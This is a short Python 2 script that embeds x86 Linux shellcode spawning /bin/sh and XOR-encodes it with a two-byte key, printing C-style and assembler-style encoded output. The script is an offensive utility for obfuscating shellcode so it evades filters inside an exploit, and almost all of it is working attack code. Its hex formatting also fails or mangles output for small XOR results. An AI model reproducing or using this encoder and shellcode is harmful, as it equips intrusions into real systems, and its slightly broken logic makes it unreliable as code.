#!/usr/bin/python

x = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90")

encoded=""
encoded2=""

xorval="aabb" #enter your 2 byte XOR value here

for i in xrange(0,len(x),2):
  y = x[i:i+2].encode('hex')
  z=int(y,16)^int(xorval,16)
  z=str(hex(z))  
  encoded += "\\x"+z[2]+z[3]+"\\x"+z[4]+z[5]
  encoded2 += "0x"+z[2]+z[3]+",0x"+z[4]+z[5]+","
  
  if int(x[i].encode('hex'),16) == int(xorval[0]+xorval[1],16):      
      print "!!! Collision !!! Choose a different XOR value."

  if int(x[i+1].encode('hex'),16) == int(xorval[2]+xorval[3],16):
      print "!!! Collision !!! Choose a different XOR value."
  
print encoded
print encoded2
print "XOR Value: "+xorval
